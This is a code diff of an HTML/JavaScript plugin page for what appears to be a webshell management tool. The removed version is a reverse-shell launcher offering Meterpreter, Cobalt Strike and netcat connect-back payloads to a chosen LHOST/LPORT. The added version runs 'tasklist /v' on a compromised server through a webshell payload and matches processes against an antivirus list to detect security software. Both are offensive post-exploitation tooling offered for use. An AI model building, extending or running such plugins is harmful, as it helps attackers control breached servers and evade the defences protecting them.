@@ -2,7 +2,7 @@
 <html lang="en-US">
 <head>
     <meta charset="UTF-8">
-    <title>Reverse Shell Controller</title>
+    <title>AV Scanner & Matcher</title>
     <style>
         html, body {
             min-height: 100%;
@@ -38,7 +38,7 @@
             color: #ffffff;
             margin-top: 0; 
             border-bottom: 1px solid #ffffff; 
-            padding-bottom: 10px;
+            padding-bottom: 10px; 
             font-size: 18px;
             text-transform: uppercase;
             letter-spacing: 2px;
@@ -57,13 +57,7 @@
         .badge-active { background: #ffffff; color: #000000; }
         .badge-error { border: 1px dashed #ffffff; background: transparent; color: #ffffff; }
         
-        .form-row {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        .form-group { flex: 1; margin-bottom: 15px; }
-        .form-group.full-width { width: 100%; }
+        .form-group { margin-bottom: 15px; }
         
         label { 
             display: block; 
@@ -74,7 +68,7 @@
             font-weight: bold;
         }
         
-        input[type="text"], select { 
+        input[type="text"] { 
             width: 100%; 
             background: #000000; 
             border: 1px solid #ffffff; 
@@ -83,26 +77,10 @@
             border-radius: 0px; 
             box-sizing: border-box; 
             font-family: inherit;
-            font-size: 13px;
         }
-        input[type="text"]:focus, select:focus {
+        input[type="text"]:focus {
             outline: none;
-            background: #111111; 
-        }
-        
-        select {
-            appearance: none;
-            -webkit-appearance: none;
-            background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></path></svg>");
-            background-repeat: no-repeat;
-            background-position-x: 98%;
-            background-position-y: 50%;
-            padding-right: 30px;
-        }
-        
-        select option {
-            background: #000000;
-            color: #ffffff;
+            background: #111111;
         }
         
         button { 
@@ -113,7 +91,7 @@
             border: 1px solid #ffffff; 
             padding: 10px 25px; 
             cursor: pointer; 
-            border-radius: 0px;
+            border-radius: 0px; 
             text-transform: uppercase;
             letter-spacing: 1px;
         }
@@ -146,63 +124,44 @@
         }
 
         .msf-line { margin-bottom: 4px; color: #ffffff; } 
-        .msf-info { color: #3498db; font-weight: bold; }    
-        .msf-success { color: #2ecc71; font-weight: bold; } 
-        .msf-warn { color: #f1c40f; font-weight: bold; }    
-        .msf-error { color: #e74c3c; font-weight: bold; }   
+        .msf-info { color: #3498db; font-weight: bold; }
+        .msf-success { color: #2ecc71; font-weight: bold; }
+        .msf-warn { color: #f1c40f; font-weight: bold; }
+        .msf-error { color: #e74c3c; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>[ REVERSE_SHELL_LAUNCHER ]</h2>
+    <h2>[ AV Task Scanner ]</h2>
     
     <div class="status-bar" id="statusBar">
-        [*] INITIALIZING INTERFACE... AWAITING HOST BRIDGE...
+        [*] Initializing system controller... awaiting logs...
     </div>
     
-    <div class="form-row">
-        <div class="form-group" style="flex: 2;">
-            <label>> LHOST (REMOTE IP)</label>
-            <input type="text" id="txtLhost" value="127.0.0.1" placeholder="e.g. 192.168.1.50">
-        </div>
-        <div class="form-group" style="flex: 1;">
-            <label>> LPORT</label>
-            <input type="text" id="txtLport" value="4444" placeholder="4444">
-        </div>
+    <div class="form-group">
+        <label>> Tasklist Command Config (JSON)</label>
+        <input type="text" id="targetJson" value='{"cmd": "tasklist /v"}'>
     </div>
 
-    <div class="form-row">
-        <div class="form-group full-width">
-            <label>> PAYLOAD PLATFORM (COMBOBOX)</label>
-            <select id="selPayloadType">
-                <option value="meterpreter">METASPLOIT METERPRETER (REVERSE_TCP)</option>
-                <option value="cobaltstrike">COBALT STRIKE BEACON (REVERSE_HTTP)</option>
-                <option value="netcat">NETCAT (NC REVERSE_SHELL)</option>
-            </select>
-        </div>
-    </div>
+    <button id="scanBtn" onclick="executePlugin()" disabled>Start Audit</button>
 
-    <button id="btnConnect" onclick="executePlugin()" disabled>TRIGGER_REVERSE_SHELL</button>
-
-    <h3>SYSTEM_LOG_OUTPUT</h3>
+    <h3>Output & Matching Log</h3>
     <div class="console" id="consoleOutput"></div>
 </div>
 
 <script>
     const pluginManifest = {
         "supportedLangs": [
-            "ASHX/NebulaPulsar/DarkMatter",
-            "ASMX/NebulaPulsar/DarkMatter",
+            "ASP/Classic/OneShell",
+            "ASHX/JScript/OneShell",
+            "ASMX/JScript/OneShell",
+            "ASPX/JScript/OneShell",
             "ASPX/NebulaPulsar/DarkMatter",
-
             "PHP/v5.X/OneShell",
             "PHP/v7.X/OneShell",
             "PHP/v8.X/OneShell",
-
             "JSP/NebulaPulsar/DarkMatter",
-            "JSPX/NebulaPulsar/DarkMatter",
-            "CFM/NebulaPulsar/DarkMatter",
         ]
     };
 
@@ -229,7 +188,7 @@
             } else if (line.startsWith('[!]')) {
                 div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
             } else {
-                div.innerText = line; 
+                div.innerText = line;
             }
 
             consoleOutput.appendChild(div);
@@ -240,26 +199,26 @@
 
     window.addEventListener('DOMContentLoaded', async () => {
         const statusBar = document.getElementById('statusBar');
-        const btnConnect = document.getElementById('btnConnect');
+        const scanBtn = document.getElementById('scanBtn');
 
         try {
             if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                 const bridge = window.chrome.webview.hostObjects.nativeBridge;
+                
                 currentShellType = await bridge.fnGetShellType();
 
                 if (pluginManifest.supportedLangs.includes(currentShellType)) {
-                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: READY`;
-                    btnConnect.disabled = false;
-                    appendLog("[*] CONNECTION ESTABLISHED TO WEB CONTEXT.");
-                    appendLog("[*] CORE PAYLOAD LISTENER MATRIX INITIALIZED.");
+                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: PROBE READY`;
+                    scanBtn.disabled = false;
+                    appendLog("[*] LINK ESTABLISHED.");
+                    appendLog("[*] READY TO RUN TASKLIST & MATCH SIGNATURES.");
                 } else {
                     statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
-                    appendLog(`[-] ABORTED. PLUGIN REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
-                    appendLog(`[-] DETECTED ENVIRONMENT: ${currentShellType}.`);
+                    appendLog(`[-] ABORTED. SCANNER REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
+                    appendLog(`[-] NODE RUNNING: ${currentShellType}.`);
                 }
             } else {
-                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. STANDALONE DRY-RUN MODE.");
-                btnConnect.disabled = false;
+                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. CORE OVERRIDE RE-ROUTE REQUIRED.");
             }
         } catch (e) {
             appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
@@ -267,34 +226,78 @@
     });
 
     async function executePlugin() {
-        const configParams = {
-            lhost: document.getElementById('txtLhost').value,
-            lport: document.getElementById('txtLport').value,
-            payloadType: document.getElementById('selPayloadType').value
-        };
+        const jsonConfig = document.getElementById('targetJson').value;
 
-        appendLog(`[*] FETCHING CORE SHELL HANDLER FOR: ${currentShellType.toUpperCase() || "STANDALONE"}`);
-        appendLog(`[*] TARGET ENDPOINT SET -> ${configParams.lhost}:${configParams.lport}`);
-        appendLog(`[*] SELECTED ENGINES: [${configParams.payloadType.toUpperCase()}]`);
+        appendLog(`[*] ALLOCATING INVENTORY PAYLOAD FOR: ${currentShellType.toUpperCase()}`);
+
+        const bridge = window.chrome.webview.hostObjects.nativeBridge;
+        const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
+        
+        const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
+        appendLog('[*] ENGAGING REMOTE TASKLIST QUERY...');
+        
+        const tasklistResultRaw = await bridge.fnRun(jsonConfig, payloadCode, currentShellType);
+        
+        appendLog('[+] RECEIVED TASKLIST FROM TARGET NODE.');
+
+        let localJsonPath = currentDir + "av_list.json";
+        if (localJsonPath.startsWith("file:///")) {
+            localJsonPath = localJsonPath.replace("file:///", "").replace(/\//g, "\\");
+        }
+
+        if (localJsonPath.startsWith("/") && localJsonPath.charAt(2) === ':') {
+            localJsonPath = localJsonPath.substring(1);
+        }
+        
+        appendLog(`[*] LOADING LOCAL SIGNATURE MATRIX FROM: ${localJsonPath}`);
+        const jsonContentRaw = await bridge.fnReadFileText(localJsonPath);
+
+        if (!jsonContentRaw) {
+            appendLog("[!] WARNING: LOCAL SIGNATURE FILE IS EMPTY OR NOT FOUND. UNABLE TO PERFORM MATCHING.");
+            appendLog("--- RAW TASKLIST OUTPUT ---");
+            appendLog(tasklistResultRaw);
+            return;
+        }
 
         try {
-            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
-                const bridge = window.chrome.webview.hostObjects.nativeBridge;
-                
-                const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
-                const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
-                
-                appendLog(`[+] DISPATCHING CONNECT-BACK COMMAND VIA ${configParams.payloadType.toUpperCase()}...`);
-                
-                const szJsonConfig = JSON.stringify(configParams);
-                const result = await bridge.fnRun(szJsonConfig, payloadCode, currentShellType);
-                
-                appendLog(result.toUpperCase());
+            const remoteProcesses = JSON.parse(tasklistResultRaw);
+            const upperProcessList = Array.isArray(remoteProcesses) ? remoteProcesses.map(p => p.toUpperCase()) : [];
+
+            const avDatabase = JSON.parse(jsonContentRaw); 
+            // { "antivirus_list": [ { "name_zh": "...", "process_keywords": [...] }, ... ] }
+            
+            appendLog("[*] PARSED SIGNATURE DATABASE SUCCESSFULLY. COMMENCING MATCHING...");
+            
+            let matchCount = 0;
+
+            if (avDatabase && Array.isArray(avDatabase.antivirus_list)) {
+                avDatabase.antivirus_list.forEach(av => {
+                    const avName = av.name;
+                    if (Array.isArray(av.process_keywords)) {
+                        av.process_keywords.forEach(keyword => {
+                            
+                            if (upperProcessList.includes(keyword.toUpperCase())) {
+                                appendLog(`[!] ALERT: DETECTED -> [${keyword}] <=> MATCHED TO: ${avName} (${av.region})`);
+                                matchCount++;
+                            }
+                        });
+                    }
+                });
+
             } else {
-                appendLog(`[!] MOCK EXECUTING: SENDING ${configParams.payloadType.toUpperCase()} TO ${configParams.lhost}:${configParams.lport}`);
+                throw new Error("INVALID JSON FORMAT: MISSING 'antivirus_list' ARRAY.");
             }
-        } catch (e) {
-            appendLog("[-] EXECUTION FAILED: " + e.message.toUpperCase());
+
+            if (matchCount === 0) {
+                appendLog("[+] ANALYSIS COMPLETE: NO KNOWN ANTI-VIRUS PROCESSES DETECTED.");
+            } else {
+                appendLog(`[+] ANALYSIS COMPLETE: DETECTED ${matchCount} CONFLICTING SYSTEM DEFENDERS.`);
+            }
+
+        } catch (jsonErr) {
+            appendLog("[-] MATRIX PARSE ERROR: FAILED TO PARSE LOCAL JSON CONTENT. " + jsonErr.message.toUpperCase());
+            appendLog("--- RAW TASKLIST OUTPUT ---");
+            appendLog(tasklistResultRaw);
         }
     }
 </script>
